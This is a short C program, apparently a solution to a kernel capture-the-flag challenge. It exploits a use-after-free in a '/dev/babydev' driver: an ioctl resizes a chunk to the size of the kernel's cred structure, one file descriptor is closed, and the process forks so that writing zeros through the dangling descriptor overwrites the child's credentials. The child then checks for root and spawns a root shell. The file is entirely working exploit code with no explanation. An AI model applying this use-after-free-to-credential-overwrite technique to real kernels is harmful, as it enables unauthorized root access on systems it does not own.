#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define bp scanf("%*c")

long num[0x100];
char *buf = (char *)num;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void exploit()
{
	// Get UAF in 0xa8 chunk(size of cred) and fork to get cred overwrite in child process
	int fd = open("/dev/babydev", O_RDWR);
	int fd2 = open("/dev/babydev", O_RDWR);
	ioctl(fd2, 0x10001, 0xa8);
	close(fd2);
	pid_t p = fork();
	if (p == 0)
	{
		// Child
		memset(buf, 0, 0x40);
		write(fd, buf, 10);
		get_shell();
	}
	else
	{
		// Parent
		wait(NULL);
	}
	return;
}

int main()
{
    exploit();
	return 0;
}
